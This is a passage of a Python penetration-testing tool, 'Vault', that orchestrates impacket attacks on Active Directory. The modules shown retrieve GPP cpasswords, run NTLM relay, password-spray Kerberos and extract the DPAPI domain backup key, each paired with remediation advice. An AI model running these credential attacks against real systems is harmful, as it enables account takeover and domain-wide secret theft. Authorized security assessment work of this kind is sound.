                               f"the Winlogon registry key on {target}. "
                               f"Account: {autologon_user}. The plaintext password is stored "
                               "in the registry and was retrieved remotely."),
                 data={"catalogue_id": "VT-REG-001",
                       "affected": f"{autologon_user}@{target}",
                       "remediation": "Remove auto-logon configuration. If auto-logon is required, use Autologon.exe from Sysinternals which encrypts the password in LSA secrets."},
                 output_file=str(out_file))
    status("reg_secrets", "Remote registry secrets", "complete")


def mod_gpp_passwords(target: str, user: str, password: str, domain: str,
                       output_dir: Path, hashes: str = "", ccache: str = "",
                       timeout: int = 300) -> None:
    status("gpp_passwords", "GPP cpassword search (SYSVOL)", "running")
    if not domain:
        err("gpp_passwords requires --domain; skipping")
        status("gpp_passwords", "GPP cpassword search", "skipped")
        return
    bin_path = _which_impacket("smbclient")
    if not bin_path:
        err("smbclient.py not found — install impacket")
        status("gpp_passwords", "GPP cpassword search", "skipped")
        return

    out_file = output_dir / "gpp_passwords.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)

    gpp_files = ["Groups.xml", "Services.xml", "ScheduledTasks.xml",
                 "DataSources.xml", "Printers.xml", "Drives.xml"]

    combined_raw = ""
    cpassword_found = False

    cmd = [bin_path] + _build_auth_args(hashes, ccache) + [auth]
    stdin_cmds = "use SYSVOL\nls\n"
    for gpp_file in gpp_files:
        stdin_cmds += f"recurse ON\nprompt OFF\nget {domain}\\Policies\\*\\Machine\\Preferences\\Groups\\{gpp_file} {output_dir / gpp_file}\n"
    stdin_cmds += "exit\n"

    raw = _run_capture_stdin(cmd, stdin_cmds, out_file, timeout=timeout,
                              env_override=_build_env(ccache))
    combined_raw += raw + "\n"

    for gpp_file in gpp_files:
        local_path = output_dir / gpp_file
        if local_path.exists():
            try:
                content = local_path.read_text(encoding="utf-8", errors="replace")
                combined_raw += f"\n[{gpp_file}]\n{content}\n"
                if "cpassword" in content.lower():
                    cpassword_found = True
            except Exception:
                pass

    out_file.write_text(combined_raw, encoding="utf-8")

    if cpassword_found:
        finding(title=f"GPP cpassword found in SYSVOL on {target}",
                 severity="CRITICAL", ip=target, port=445,
                 description=("Group Policy Preferences XML files in SYSVOL contain cpassword "
                               "attributes. The AES-256 key used to encrypt these values is "
                               "publicly known (MS14-025), so any domain user can decrypt them "
                               "to recover plaintext credentials."),
                 data={"catalogue_id": "VT-GPP-001",
                       "affected": target,
                       "remediation": "Delete GPP XML files containing cpassword from SYSVOL. Apply MS14-025. Use LAPS for local admin passwords instead."},
                 output_file=str(out_file))

    status("gpp_passwords", "GPP cpassword search", "complete")


# ── Relay & Spray Modules (B4) ──────────────────────────────────────────────

def mod_ntlm_relay(target: str, user: str, password: str, domain: str,
                    output_dir: Path, hashes: str = "", ccache: str = "",
                    timeout: int = 60) -> None:
    status("ntlm_relay", "NTLM relay validation (ntlmrelayx)", "running")
    bin_path = _which_impacket("ntlmrelayx")
    if not bin_path:
        err("ntlmrelayx.py not found — install impacket")
        status("ntlm_relay", "NTLM relay validation", "skipped")
        return

    out_file = output_dir / "ntlm_relay.txt"
    relay_timeout = min(timeout, 60)

    log(f"Starting ntlmrelayx relay probe against smb://{target} "
        f"(capture window: {relay_timeout}s)")

    cmd = [bin_path, "-t", f"smb://{target}", "--no-multirelay",
           "--no-da", "--no-acl"]

    raw = ""
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, env=os.environ.copy())
        try:
            raw, _ = proc.communicate(timeout=relay_timeout)
        except subprocess.TimeoutExpired:
            proc.send_signal(signal.SIGINT)
            try:
                raw, _ = proc.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                raw, _ = proc.communicate()
        out_file.write_text(raw or "", encoding="utf-8")
    except Exception as exc:
        err(f"ntlmrelayx failed: {exc}")
        try:
            out_file.write_text(f"ERROR: {exc}", encoding="utf-8")
        except Exception:
            pass
        status("ntlm_relay", "NTLM relay validation", "error")
        return

    relay_success = bool(re.search(
        r"Authenticating against smb://|Target .+ authenticated|"
        r"executed .+ on .+|SUCCEED", raw, re.I))
    relay_listening = bool(re.search(
        r"Setting up SMB Server|Servers started", raw, re.I))

    if relay_success:
        finding(title=f"NTLM relay attack succeeded against {target}",
                 severity="CRITICAL", ip=target, port=445,
                 description=(f"ntlmrelayx successfully relayed NTLM authentication "
                               f"to smb://{target}. The host does not require SMB signing "
                               "and accepted a relayed credential."),
                 data={"catalogue_id": "VT-RELAY-001",
                       "affected": target,
                       "remediation": "Enable SMB signing on all hosts. Disable NTLM where "
                                      "possible; enforce NTLMv2-only and EPA."},
                 output_file=str(out_file))
    elif relay_listening:
        finding(title=f"NTLM relay channel open to {target} (no auth captured in window)",
                 severity="HIGH", ip=target, port=445,
                 description=("ntlmrelayx confirmed the relay infrastructure is viable — "
                               f"SMB signing is not required on {target} and the relay server "
                               "started. No auth was captured during the probe window."),
                 data={"catalogue_id": "VT-RELAY-001",
                       "affected": target,
                       "remediation": "Enable SMB signing on all hosts. Disable LLMNR/NBT-NS."},
                 output_file=str(out_file))

    status("ntlm_relay", "NTLM relay validation", "complete")


def mod_password_spray(target: str, user: str, password: str, domain: str,
                        output_dir: Path, hashes: str = "", ccache: str = "",
                        timeout: int = 300, password_list: str = "",
                        spray_delay: int = 30, lockout_threshold: int = 5) -> None:
    status("password_spray", "Password spraying (getTGT loop)", "running")
    if not domain:
        err("password_spray requires --domain; skipping")
        status("password_spray", "Password spraying", "skipped")
        return

    bin_path = _which_impacket("getTGT")
    if not bin_path:
        err("getTGT.py not found — install impacket")
        status("password_spray", "Password spraying", "skipped")
        return

    passwords: list[str] = []
    if password_list:
        try:
            passwords = [
                l.strip() for l in Path(password_list).read_text(encoding="utf-8").splitlines()
                if l.strip() and not l.startswith("#")]
        except Exception as exc:
            err(f"Failed to read password list: {exc}")
    if not passwords:
        if password:
            passwords = [password]
        else:
            err("password_spray: no passwords to try (provide --password-list or --password)")
            status("password_spray", "Password spraying", "skipped")
            return

    users: list[str] = []
    ldap_users_file = output_dir / "ldap_dump" / "getadusers.txt"
    if ldap_users_file.exists():
        try:
            for line in ldap_users_file.read_text(encoding="utf-8").splitlines():
                if (line.strip() and not line.startswith("Impacket")
                        and not line.startswith("Name") and not line.startswith("-")):
                    parts = line.split()
                    if parts:
                        users.append(parts[0])
        except Exception:
            pass
    if not users and user:
        users = [user]
    if not users:
        err("password_spray: no users to spray (run ldap_enum first or provide --user)")
        status("password_spray", "Password spraying", "skipped")
        return

    out_file = output_dir / "password_spray.txt"
    results: list[str] = []
    valid_creds: list[tuple[str, str]] = []
    failure_counts: dict[str, int] = {}

    log(f"Spraying {len(passwords)} password(s) against {len(users)} user(s) "
        f"(delay={spray_delay}s, threshold={lockout_threshold})")

    for round_idx, pw in enumerate(passwords):
        if round_idx > 0:
            log(f"Waiting {spray_delay}s before next spray round...")
            time.sleep(spray_delay)

        for u in users:
            if failure_counts.get(u, 0) >= lockout_threshold:
                continue
            auth_str = f"{domain}/{u}:{pw}"
            cmd = [bin_path, auth_str, "-dc-ip", target]
            try:
                cp = subprocess.run(cmd, capture_output=True, text=True,
                                    timeout=min(timeout, 30))
                raw = (cp.stdout or "") + (cp.stderr or "")
                results.append(f"[{u}:{pw}] rc={cp.returncode}\n{raw}\n")
                if cp.returncode == 0 and re.search(r"Saving ticket|\.ccache", raw):
                    valid_creds.append((u, pw))
                    log(f"VALID: {domain}\\{u}:{pw}")
                else:
                    failure_counts[u] = failure_counts.get(u, 0) + 1
            except subprocess.TimeoutExpired:
                results.append(f"[{u}:{pw}] TIMEOUT\n")
                failure_counts[u] = failure_counts.get(u, 0) + 1
            except Exception as exc:
                results.append(f"[{u}:{pw}] ERROR: {exc}\n")

    out_file.write_text("\n".join(results), encoding="utf-8")

    if valid_creds:
        cred_list = "; ".join(f"{domain}\\{u}:{pw}" for u, pw in valid_creds)
        finding(title=f"Valid credentials via password spray ({len(valid_creds)} account(s))",
                 severity="HIGH", ip=target, port=88,
                 description=(f"Password spraying against {target} discovered "
                               f"{len(valid_creds)} valid credential pair(s): {cred_list}."),
                 data={"catalogue_id": "VT-SPRAY-001",
                       "affected": ", ".join(f"{domain}\\{u}" for u, _ in valid_creds),
                       "remediation": "Enforce 14+ character passwords. Implement account lockout. "
                                      "Deploy banned-password list. Enable MFA."},
                 output_file=str(out_file))

    lockout_victims = [u for u, c in failure_counts.items() if c >= lockout_threshold]
    if lockout_victims:
        log(f"Stopped spraying {len(lockout_victims)} account(s) at lockout threshold "
            f"({lockout_threshold}): {', '.join(lockout_victims[:10])}")

    status("password_spray", "Password spraying", "complete")


def mod_dpapi(target: str, user: str, password: str, domain: str,
               output_dir: Path, hashes: str = "", ccache: str = "",
               timeout: int = 300) -> None:
    status("dpapi", "DPAPI backup key extraction", "running")
    if not domain:
        err("dpapi requires --domain; skipping")
        status("dpapi", "DPAPI backup key extraction", "skipped")
        return

    bin_path = _which_impacket("dpapi")
    if not bin_path:
        err("dpapi.py not found — install impacket")
        status("dpapi", "DPAPI backup key extraction", "skipped")
        return

    out_file = output_dir / "dpapi_backupkeys.txt"
    auth = _build_auth_string(target, user, password, domain, hashes)

    cmd = [bin_path, "backupkeys", "-t", target]
    cmd += _build_auth_args(hashes, ccache)
    if not hashes and not ccache:
        cmd += [auth]
    else:
        cmd += [f"{domain}/{user}@{target}"]

    raw = _run_capture(cmd, out_file, timeout=timeout,
                       env_override=_build_env(ccache))

    key_found = bool(re.search(
        r"domain backup key|backup key saved|\.pvk|legacy key", raw, re.I))
    pvk_files = list(output_dir.glob("*.pvk"))
    if pvk_files:
        key_found = True

    if key_found:
        finding(title=f"DPAPI domain backup key extracted from {target}",
                 severity="HIGH", ip=target, port=445,
                 description=(f"dpapi.py backupkeys retrieved the domain DPAPI backup key "
                               f"from {target}. This key can decrypt any DPAPI-protected "
                               "secret on any domain-joined machine."),
                 data={"catalogue_id": "VT-DPAPI-001",
                       "affected": domain,
                       "remediation": "Rotate the DPAPI backup key. Restrict who can request it. "
                                      "Monitor Event ID 4662 for ms-Bkrp-BackupKey access."},
                 output_file=str(out_file))

    status("dpapi", "DPAPI backup key extraction", "complete")


# ── Main ──────────────────────────────────────────────────────────────────────

def _risk_counts(findings: list) -> dict:
    rc = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        r = str(f.get("risk", "")).upper()
        if r in rc:
            rc[r] += 1
    return rc


def _write_findings_csv(path: Path, findings: list) -> None:
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=_CSV_FIELDS, extrasaction="ignore")
            w.writeheader()
            for fd in findings:
                w.writerow({k: fd.get(k, "") for k in _CSV_FIELDS})
    except Exception as exc:
        err(f"findings.csv write failed: {exc}")


def _load_targets(targets_file: str) -> list[str]:
    targets = []
    try:
        for line in Path(targets_file).read_text(encoding="utf-8").splitlines():
            t = line.strip()
            if t and not t.startswith("#"):
                targets.append(t)
    except Exception as exc:
        err(f"Failed to read targets file: {exc}")
    return targets


def _resolve_modules(raw: str) -> set:
    requested = set()
    for token in raw.split(","):
        token = token.strip()
        if token in _MODULE_GROUPS:
            group = _MODULE_GROUPS[token]
            if group is None:
                return _ALL_MODULES.copy()
            requested |= group
        else:
            requested.add(token)
    return requested


def _run_against_target(target: str, args, requested: set,
                         project_dir: Path) -> None:
    has_creds = bool(args.user and (args.password or args.hashes or args.ccache))

    if "smb_relay" in requested:
        mod_smb_relay(target, project_dir, timeout=min(args.timeout, 60))

    if "asreproast" in requested:
        mod_asreproast(target, args.user, args.password, args.domain,
                        project_dir,
                        users_file=Path(args.users_file) if args.users_file else None,
                        hashes=args.hashes, ccache=args.ccache,
                        timeout=args.timeout)

    if has_creds:
        if "kerberoast" in requested:
            mod_kerberoast(target, args.user, args.password, args.domain,
                            project_dir, hashes=args.hashes, ccache=args.ccache,
                            timeout=args.timeout)
        if "secretsdump" in requested:
            sd_timeout = args.timeout if args.timeout != 300 else 900
            mod_secretsdump(target, args.user, args.password, args.domain,
                             project_dir, hashes=args.hashes, ccache=args.ccache,
                             timeout=sd_timeout)
        if "ldap_enum" in requested:
            mod_ldap_enum(target, args.user, args.password, args.domain,
                           project_dir, hashes=args.hashes, ccache=args.ccache,
                           timeout=args.timeout)
        if "sid_enum" in requested:
            mod_sid_enum(target, args.user, args.password, args.domain,
                          project_dir, hashes=args.hashes, ccache=args.ccache,
                          timeout=args.timeout)
        if "sam_dump" in requested:
            mod_sam_dump(target, args.user, args.password, args.domain,
                          project_dir, hashes=args.hashes, ccache=args.ccache,
                          timeout=args.timeout)
        if "delegation" in requested:
            mod_delegation(target, args.user, args.password, args.domain,
                            project_dir, hashes=args.hashes, ccache=args.ccache,
                            timeout=args.timeout)
        if "spn_scan" in requested:
            mod_spn_scan(target, args.user, args.password, args.domain,
                          project_dir, hashes=args.hashes, ccache=args.ccache,
                          timeout=args.timeout)
        if "pth_exec" in requested:
            mod_pth_exec(target, args.user, args.password, args.domain,
                          project_dir, hashes=args.hashes, ccache=args.ccache,
                          timeout=args.timeout)
        if "dcom_exec" in requested:
            mod_dcom_exec(target, args.user, args.password, args.domain,
                           project_dir, hashes=args.hashes, ccache=args.ccache,
                           timeout=args.timeout)
        if "tgt_request" in requested:
            mod_tgt_request(target, args.user, args.password, args.domain,
                             project_dir, hashes=args.hashes, ccache=args.ccache,
                             timeout=args.timeout)
        if "service_ticket" in requested:
            mod_service_ticket(target, args.user, args.password, args.domain,
                                project_dir, hashes=args.hashes, ccache=args.ccache,
                                timeout=args.timeout, spn=args.spn)
        if "share_enum" in requested:
            mod_share_enum(target, args.user, args.password, args.domain,
                            project_dir, hashes=args.hashes, ccache=args.ccache,
                            timeout=args.timeout)
        if "reg_secrets" in requested:
            mod_reg_secrets(target, args.user, args.password, args.domain,
                             project_dir, hashes=args.hashes, ccache=args.ccache,
                             timeout=args.timeout)
        if "gpp_passwords" in requested:
            mod_gpp_passwords(target, args.user, args.password, args.domain,
                               project_dir, hashes=args.hashes, ccache=args.ccache,
                               timeout=args.timeout)
        if "ntlm_relay" in requested:
            mod_ntlm_relay(target, args.user, args.password, args.domain,
                            project_dir, hashes=args.hashes, ccache=args.ccache,
                            timeout=args.timeout)
        if "password_spray" in requested:
            mod_password_spray(target, args.user, args.password, args.domain,
                                project_dir, hashes=args.hashes, ccache=args.ccache,
                                timeout=args.timeout,
                                password_list=getattr(args, 'password_list', '') or "",
                                spray_delay=getattr(args, 'spray_delay', 30),
                                lockout_threshold=getattr(args, 'lockout_threshold', 5))
        if "dpapi" in requested:
            mod_dpapi(target, args.user, args.password, args.domain,
                       project_dir, hashes=args.hashes, ccache=args.ccache,
                       timeout=args.timeout)
    else:
        cred_mods = requested & {"secretsdump", "kerberoast", "ldap_enum",
                                  "sid_enum", "sam_dump", "delegation", "spn_scan",
                                  "pth_exec", "dcom_exec", "tgt_request",
                                  "service_ticket", "share_enum", "reg_secrets",
                                  "gpp_passwords", "ntlm_relay", "password_spray",
                                  "dpapi"}
        if cred_mods:
            log(f"Modules {', '.join(sorted(cred_mods))} require credentials "
                "(--user + --password/--hashes/--ccache); skipping")


def main() -> int:
    p = argparse.ArgumentParser(prog="vault",
                                  description="Vault — AD / SMB credential test orchestrator")
    p.add_argument("--target", default="", help="Target DC / SMB host")
    p.add_argument("--targets-file", help="File with one target IP per line")
    p.add_argument("--user", default="", help="Username (omit for null/AS-REP modes)")
    p.add_argument("--password", default="", help="Password")
    p.add_argument("--hashes", default="", help="NTLM hash in LMHASH:NTHASH format for pass-the-hash")
    p.add_argument("--ccache", default="", help="Path to Kerberos ccache file for ticket-based auth")
    p.add_argument("--domain", default="", help="Domain / realm")
    p.add_argument("--users-file", help="Path to users-file for AS-REP roasting")
    p.add_argument("--spn", default="", help="Target SPN for service_ticket module (e.g. MSSQLSvc/db.corp.local)")
    p.add_argument("--password-list", help="Password list file for spray module")
    p.add_argument("--spray-delay", type=int, default=30,
                    help="Seconds between spray rounds (default 30)")
    p.add_argument("--lockout-threshold", type=int, default=5,
                    help="Max failures per account before stopping (default 5)")
    p.add_argument("--modules", default="all",
                    help="Comma-separated modules or groups: all, credential, enum, exec, relay, "
                         "secretsdump, kerberoast, asreproast, smb_relay, "
                         "ldap_enum, sid_enum, sam_dump, delegation, spn_scan, "
                         "pth_exec, dcom_exec, tgt_request, service_ticket, "
                         "share_enum, reg_secrets, gpp_passwords, "
                         "ntlm_relay, password_spray, dpapi")
    p.add_argument("--timeout", type=int, default=300,
                    help="Per-module timeout in seconds (default 300; secretsdump defaults to 900)")
    p.add_argument("--client-short", default="default")
    p.add_argument("--client-name", default="", help="Full client name (defaults to --client-short)")
    p.add_argument("--engagement-name", default="vault run", help="Engagement name for meta.json")
    p.add_argument("--project", help="Override project output directory")
    p.add_argument("--version", action="store_true")
    args = p.parse_args()

    if args.version:
        print(VERSION)
        return 0

    targets = []
    if args.targets_file:
        targets = _load_targets(args.targets_file)
    if args.target:
        if args.target not in targets:
            targets.insert(0, args.target)
    if not targets:
        err("No targets specified — provide --target or --targets-file")
        return 1

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    if args.project:
        project_dir = Path(args.project)
    elif _us is not None:
        project_dir = _us.universal_run_dir(args.client_short, "vault",
                                              year=datetime.now().strftime("%Y"),
                                              ts=ts)
    else:
        project_dir = Path.cwd() / f"vault_{args.client_short}_{ts}"
    project_dir.mkdir(parents=True, exist_ok=True)

    global _RUN_DIR, _RUNLOG
    _RUN_DIR = project_dir
    if _el is not None:
        try:
            _RUNLOG = _el.EventLogger(project_dir / "scan.log",
                                       errors_path=project_dir / "errors.log")
        except Exception:
            _RUNLOG = None

    if _us is not None:
        _us.write_meta(project_dir, _us.make_meta(
            tool="vault", version=VERSION,
            client_short=args.client_short,
            client_name=(args.client_name or args.client_short),
            engagement_name=args.engagement_name,
            target=targets[0] if len(targets) == 1 else ",".join(targets)))

    target_label = targets[0] if len(targets) == 1 else f"{len(targets)} targets"
    log(f"Vault v{VERSION} starting against {target_label} — project: {project_dir}")
    started_at = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    requested = _resolve_modules(args.modules)

    multi = len(targets) > 1
    for target in targets:
        if multi:
            target_dir = project_dir / target.replace(":", "_")
            target_dir.mkdir(parents=True, exist_ok=True)
            log(f"── Target: {target} ──")
        else:
            target_dir = project_dir
        _run_against_target(target, args, requested, target_dir)

    ended_at = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    if _us is not None:
        out = [_us.augment_finding(dict(f), tool="vault") for f in _findings]
        _us.atomic_write_json(project_dir / "findings.json", out)
        _write_findings_csv(project_dir / "findings.csv", out)
        try:
            summary = _us.make_summary(
                tool="vault", version=VERSION,
                scan_start=started_at, scan_end=ended_at,
                target=target_label,
                success=True, total_findings=len(out),
                risk_counts=_risk_counts(out))
            _us.write_summary(project_dir, summary)
        except Exception as exc:
            err(f"summary.json write failed: {exc}")
    else:
        (project_dir / "findings.json").write_text(
            json.dumps(_findings, indent=2), encoding="utf-8")
        _write_findings_csv(project_dir / "findings.csv", _findings)

    log(f"Vault complete — {len(_findings)} finding(s) — output: {project_dir}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
